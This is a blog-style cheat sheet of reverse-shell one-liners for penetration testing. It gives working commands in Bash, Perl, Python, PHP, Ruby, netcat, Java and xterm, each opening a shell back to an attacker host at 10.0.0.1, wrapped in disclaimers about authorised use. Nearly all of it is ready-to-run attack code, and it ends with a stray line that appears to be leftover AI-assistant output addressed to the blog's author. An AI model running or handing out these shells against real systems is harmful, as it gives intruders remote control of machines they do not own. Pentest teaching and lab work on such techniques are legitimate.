---
title: Reverse Shell Cheat Sheet
categories: [Cheatsheet]
tags: [reverseshell]
author: bilash
---

## Reverse Shell Cheat Sheet

In the field of penetration testing, discovering a command execution vulnerability is often a significant breakthrough. Once identified, gaining an interactive shell to the target system is typically the next step. If it’s not feasible to add a new user, SSH key, or modify files like .rhosts for direct access, a reverse shell becomes a powerful method to establish a remote connection.

This guide focuses on reverse shells—an essential technique for remote access. A reverse shell allows an attacker (in an ethical context, the penetration tester) to bypass firewall restrictions by having the target system initiate the connection back to the attacker’s machine. The following examples are geared towards Unix-like systems, though similar commands will work on Windows by replacing /bin/sh -i with cmd.exe in most cases.

It’s important to note that these techniques should only be used in authorized, controlled environments (such as penetration tests with proper permissions). Always ensure you're conducting your security testing within the bounds of ethical and legal guidelines.

### 1. Bash Reverse Shell

Bash, a common shell on Unix-like systems, can be used to open a reverse shell connection. Here's how you can set it up:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

This command initiates a TCP connection to `10.0.0.1` on port `8080`, redirecting the shell's input and output streams through the connection.

### 2. Perl Reverse Shell

Perl, another widely available language on many systems, can also be used to execute a reverse shell. The following Perl one-liner creates a TCP socket and connects to the specified IP and port:

```pearl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 3. Python Reverse Shell

If Python is available on the target system, this one-liner provides a reverse shell by establishing a socket connection. This example was tested on systems running Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

This command redirects standard input, output, and error streams to the connection, allowing full interaction with the target system.

### 4. PHP Reverse Shell

PHP is commonly found on web servers. This one-liner opens a TCP connection to the attacker's machine and redirects the shell’s input and output:

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 5. Ruby Reverse Shell

Ruby can also be used to establish a reverse shell connection. The following Ruby command opens a socket to the attacker's machine and redirects the shell input/output:

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 6. Netcat Reverse Shell

Netcat is one of the most well-known tools for creating reverse shells, though some versions of Netcat don’t support the `-e` flag. If that's the case, you can use an alternative method:

For versions with the `-e` option:

```shell
nc -e /bin/sh 10.0.0.1 1234
```

For versions without the `-e` flag, try this workaround:

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

This method uses a named pipe to facilitate the reverse shell connection.

### 7. Java Reverse Shell

Java can be used to execute a reverse shell by utilizing its Runtime.getRuntime() method. The following Java one-liner opens a connection back to the attacker's machine:

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 8. Xterm Reverse Shell

If X11 forwarding is enabled, you can leverage an xterm session as a reverse shell. The following command is run on the target system to initiate the connection back to the attacker:

```shell
xterm -display 10.0.0.1:1
```

On the attacker's machine, run an X server:

```shell
Xnest :1
```

Additionally, authorize the target system to connect to your X server:

```shell
xhost +targetip
```

## Ethical Considerations

While reverse shells are incredibly useful for legitimate penetration testing and security assessments, it's crucial to understand the ethical implications of their use. These techniques should only be employed within the scope of authorized testing, such as with explicit permission from the system owner, or within controlled environments like Capture the Flag (CTF) challenges or penetration testing labs.

Penetration testing is a critical part of cybersecurity and is intended to identify vulnerabilities that could be exploited by malicious actors. Always ensure that your testing activities are legal and authorized. Engaging in unauthorized access to systems, networks, or data is illegal and unethical.

## Conclusion
Understanding how to establish a reverse shell is an essential skill for anyone in the field of penetration testing. The methods presented here are applicable to a wide range of systems, from Unix-based platforms to environments with scripting languages like Python, Perl, and Ruby.

Always remember: ethical hacking is about improving security and protecting systems, not exploiting them for personal gain. Use these techniques responsibly and only within the bounds of authorization.

This revision includes a focus on the ethical use of penetration testing tools, emphasizing the importance of authorization and responsibility. It should provide a comprehensive, professional, and educational overview of reverse shells for your learning blog!


